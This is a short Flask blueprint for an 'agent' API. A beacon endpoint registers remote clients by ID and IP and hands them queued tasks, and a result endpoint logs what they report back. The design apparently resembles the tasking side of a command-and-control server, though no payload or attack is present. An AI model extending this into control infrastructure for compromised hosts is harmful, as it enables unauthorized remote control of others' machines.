from flask import Blueprint, request, jsonify
from core.guard import guard
from core.db import db
import time

agent_bp = Blueprint('agent', __name__, url_prefix='/api/agent')

@agent_bp.route('/beacon', methods=['POST'])
def beacon():
    ip = guard.get_client_ip()
    cid = request.headers.get('X-ID')
    
    if not cid: return jsonify({'error': 'No ID'}), 400
    
    # Update client info
    clients = db.get_state('clients', {})
    if cid not in clients:
        clients[cid] = {'id': cid, 'ip': ip, 'first': time.time()}
    
    clients[cid]['last_seen'] = time.time()
    db.set_state('clients', clients)
    
    # Get tasks
    tasks = db.get_state('tasks', {})
    pending = tasks.get(cid, [])
    if pending:
        tasks[cid] = []
        db.set_state('tasks', tasks)
        
    return jsonify({'tasks': pending})

@agent_bp.route('/result', methods=['POST'])
def result():
    data = request.get_json(silent=True) or {}
    cid = data.get('id')
    if not cid: return jsonify({'ok': False}), 400
    
    # Store result in DB
    db.log('AGENT', f"Result from {cid}: {data.get('type')}")
    # Implementation of persistent result storage...
    
    return jsonify({'ok': True})
